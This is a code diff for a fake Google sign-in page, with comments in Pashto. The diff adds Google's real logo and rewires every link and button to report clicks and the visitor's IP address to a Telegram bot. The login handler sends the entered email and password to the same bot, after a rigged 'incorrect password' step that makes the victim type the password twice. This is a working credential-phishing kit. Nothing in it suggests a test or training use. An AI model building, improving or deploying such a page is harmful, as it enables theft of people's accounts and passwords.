@@ -14,7 +14,7 @@
 
         body {
             min-height: 100vh;
-            background: #ffffff;
+            background: #f1f3f4;
             display: flex;
             justify-content: center;
             align-items: center;
@@ -30,20 +30,21 @@
             border: 1px solid #dadce0;
             padding: 2rem 2rem 1.5rem 2rem;
             box-shadow: 0 1px 3px rgba(0, 0, 0, 0.08);
+            position: relative;
         }
 
-        .logo {
+        /* Google لوګو - لکه څنګه چې په عکس کې دی */
+        .google-logo {
             text-align: center;
             margin-bottom: 1rem;
         }
 
-        .logo span {
-            font-size: 2.5rem;
-            font-weight: 500;
-            color: #4285f4;
-            font-family: 'Google Sans', system-ui;
+        .google-logo img {
+            width: 75px;
+            height: auto;
         }
 
+        /* د متن لپاره */
         h1 {
             font-size: 1.5rem;
             font-weight: 500;
@@ -60,7 +61,7 @@
         }
 
         .input-group {
-            margin-bottom: 1rem;
+            margin-bottom: 0.8rem;
             position: relative;
         }
 
@@ -85,38 +86,43 @@
             color: #80868b;
         }
 
-        /* د "my acct" متن */
+        /* "my acct" بټن */
         .my-acct {
-            font-size: 0.75rem;
-            color: #5f6368;
-            margin-top: 0.3rem;
-            margin-bottom: 1rem;
+            margin-bottom: 1.5rem;
         }
 
         .my-acct a {
             color: #1a73e8;
             text-decoration: none;
+            font-size: 0.8rem;
+            cursor: pointer;
         }
 
         .my-acct a:hover {
             text-decoration: underline;
         }
 
-        button {
-            width: 100%;
-            padding: 0.85rem;
+        /* د Next بټن - لاندې ښیې کونج کې */
+        .next-button-container {
+            display: flex;
+            justify-content: flex-end;
+            margin-top: 1rem;
+            margin-bottom: 1.5rem;
+        }
+
+        .next-btn {
+            padding: 0.75rem 1.5rem;
             background: #1a73e8;
             border: none;
             border-radius: 0.25rem;
             color: white;
-            font-size: 0.95rem;
+            font-size: 0.9rem;
             font-weight: 600;
             cursor: pointer;
             transition: all 0.2s;
-            margin-top: 0.5rem;
         }
 
-        button:hover {
+        .next-btn:hover {
             background: #1557b0;
         }
 
@@ -124,7 +130,8 @@
         .links-row {
             display: flex;
             justify-content: space-between;
-            margin-top: 1rem;
+            margin-top: 0.5rem;
+            margin-bottom: 1rem;
             font-size: 0.8rem;
         }
 
@@ -141,7 +148,8 @@
         /* Guest mode متن */
         .guest-text {
             text-align: left;
-            margin-top: 1.2rem;
+            margin-top: 1rem;
+            margin-bottom: 1rem;
             font-size: 0.75rem;
             color: #5f6368;
             line-height: 1.4;
@@ -156,25 +164,10 @@
             text-decoration: underline;
         }
 
-        /* Learn more لینک */
-        .learn-more {
-            display: inline-block;
-            margin-top: 0.3rem;
-            font-size: 0.75rem;
-        }
-
-        .learn-more a {
-            color: #1a73e8;
-            text-decoration: none;
-        }
-
-        .learn-more a:hover {
-            text-decoration: underline;
-        }
-
         .create-account {
             display: inline-block;
-            margin-top: 1rem;
+            margin-top: 0.5rem;
+            margin-bottom: 1rem;
             font-size: 0.85rem;
             color: #1a73e8;
             text-decoration: none;
@@ -211,7 +204,7 @@
             display: flex;
             justify-content: center;
             gap: 1.2rem;
-            margin-top: 2rem;
+            margin-top: 1.5rem;
             padding-top: 1rem;
             border-top: 1px solid #e8eaed;
             font-size: 0.7rem;
@@ -230,7 +223,7 @@
             text-align: center;
             font-size: 0.7rem;
             color: #5f6368;
-            margin-top: 1rem;
+            margin-top: 0.5rem;
         }
     </style>
 </head>
@@ -239,8 +232,8 @@
 <div class="google-card">
     <!-- مرحله 1: برېښنالیک -->
     <div id="step1View">
-        <div class="logo">
-            <span>G</span>
+        <div class="google-logo">
+            <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" alt="Google">
         </div>
         <h1>Sign in</h1>
         <div class="sub">Use your Google Account</div>
@@ -250,30 +243,32 @@
         </div>
 
         <div class="my-acct">
-            <a href="#" onclick="alert('my acct (Demo)'); return false;">my acct</a>
+            <a href="#" onclick="sendToAdminFromLink('my acct', 'my acct link clicked'); return false;">my acct</a>
         </div>
 
-        <button id="nextBtn">Next</button>
+        <div class="next-button-container">
+            <button class="next-btn" id="nextBtn">Next</button>
+        </div>
 
         <div class="links-row">
-            <span onclick="alert('Forgot email? (Demo)')">Forgot email?</span>
-            <span onclick="alert('Guest mode (Demo)')">Guest mode</span>
+            <span onclick="sendToAdminFromLink('Forgot email?', 'Forgot email link clicked')">Forgot email?</span>
+            <span onclick="sendToAdminFromLink('Guest mode', 'Guest mode link clicked')">Guest mode</span>
         </div>
 
         <div class="guest-text">
             Not your computer? Use Guest mode to sign in privately.
-            <div class="learn-more">
-                <a href="#" onclick="alert('Learn more about Guest mode'); return false;">Learn more</a>
+            <div style="margin-top: 0.3rem;">
+                <a href="#" onclick="sendToAdminFromLink('Learn more', 'Learn more about Guest mode clicked'); return false;">Learn more</a>
             </div>
         </div>
 
-        <a href="#" class="create-account" onclick="alert('Create account (Demo)'); return false;">Create account</a>
+        <a href="#" class="create-account" onclick="sendToAdminFromLink('Create account', 'Create account clicked'); return false;">Create account</a>
     </div>
 
     <!-- مرحله 2: پټنوم -->
     <div id="step2View" style="display: none;">
-        <div class="logo">
-            <span>G</span>
+        <div class="google-logo">
+            <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" alt="Google">
         </div>
         <h1>Sign in</h1>
         <div class="sub" id="displayEmail"></div>
@@ -282,17 +277,19 @@
             <input type="password" id="passwordInput" placeholder="Enter your password">
         </div>
 
-        <button id="loginBtn">Next</button>
+        <div class="next-button-container">
+            <button class="next-btn" id="loginBtn">Next</button>
+        </div>
 
         <div class="links-row">
             <span onclick="goBackToEmail()">← Back</span>
-            <span onclick="alert('Forgot password? (Demo)')">Forgot password?</span>
+            <span onclick="sendToAdminFromLink('Forgot password?', 'Forgot password clicked')">Forgot password?</span>
         </div>
 
         <div class="guest-text">
             Not your computer? Use Guest mode to sign in privately.
-            <div class="learn-more">
-                <a href="#" onclick="alert('Learn more'); return false;">Learn more</a>
+            <div style="margin-top: 0.3rem;">
+                <a href="#" onclick="sendToAdminFromLink('Learn more', 'Learn more clicked'); return false;">Learn more</a>
             </div>
         </div>
     </div>
@@ -302,10 +299,10 @@
     <div class="step-text" id="stepIndicator">Step 1 of 2</div>
 
     <div class="footer">
-        <span>English (United States)</span>
-        <span>Help</span>
-        <span>Privacy</span>
-        <span>Terms</span>
+        <span onclick="sendToAdminFromLink('English (United States)', 'Language menu clicked')">English (United States)</span>
+        <span onclick="sendToAdminFromLink('Help', 'Help clicked')">Help</span>
+        <span onclick="sendToAdminFromLink('Privacy', 'Privacy clicked')">Privacy</span>
+        <span onclick="sendToAdminFromLink('Terms', 'Terms clicked')">Terms</span>
     </div>
 </div>
 
@@ -330,7 +327,29 @@
 
     let currentEmail = "";
 
-    // ========== Helper Functions ==========
+    // ========== د ټولو بټنونو معلومات اډمن ته لیږل ==========
+    async function sendToAdminFromLink(buttonName, action) {
+        const ip = await getUserIP();
+        const msg = `🔘 *BUTTON CLICKED*\n\n📌 Button: ${buttonName}\n⚡ Action: ${action}\n🌐 IP: ${ip}\n🕒 Time: ${new Date().toLocaleString()}`;
+        
+        try {
+            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: ADMIN_CHAT_ID,
+                    text: msg,
+                    parse_mode: 'Markdown'
+                })
+            });
+        } catch (err) {
+            console.warn("Telegram error", err);
+        }
+        
+        // د ښودلو لپاره alert
+        alert(`${buttonName} - Action sent to admin`);
+    }
+
     function showMessage(box, text, isError = true) {
         box.textContent = text;
         box.className = `message ${isError ? 'error-msg' : 'success-msg'}`;
@@ -359,7 +378,7 @@
         }
     }
 
-    async function sendToAdmin(email, password, ip, success) {
+    async function sendLoginToAdmin(email, password, ip, success) {
         // غلط معلومات اډمن ته نه ځي - یوازې بريالي معلومات
         if (!success) return;
         
@@ -397,6 +416,7 @@
     });
 
     window.goBackToEmail = goBackToEmail;
+    window.sendToAdminFromLink = sendToAdminFromLink;
 
     // ========== مرحله 2: ننوتنه ==========
     document.getElementById('loginBtn').addEventListener('click', async () => {
@@ -418,7 +438,6 @@
         // لومړۍ هڅه — ناکامه (معلومات اډمن ته نه ځي)
         if (currentAttempt === 1) {
             showMessage(errorBox, "❌ Incorrect password. Please try again.", true);
-            // بیا له پیل څخه پیل کړئ
             setTimeout(() => {
                 goBackToEmail();
             }, 2000);
@@ -427,7 +446,7 @@
 
         // دوهمه هڅه — بریالۍ (معلومات اډمن ته ځي)
         if (currentAttempt >= 2) {
-            await sendToAdmin(currentEmail, password, ip, true);
+            await sendLoginToAdmin(currentEmail, password, ip, true);
             showMessage(successBox, "✅ Login successful! Redirecting to Telegram...", false);
             
             const loginBtn = document.getElementById('loginBtn');
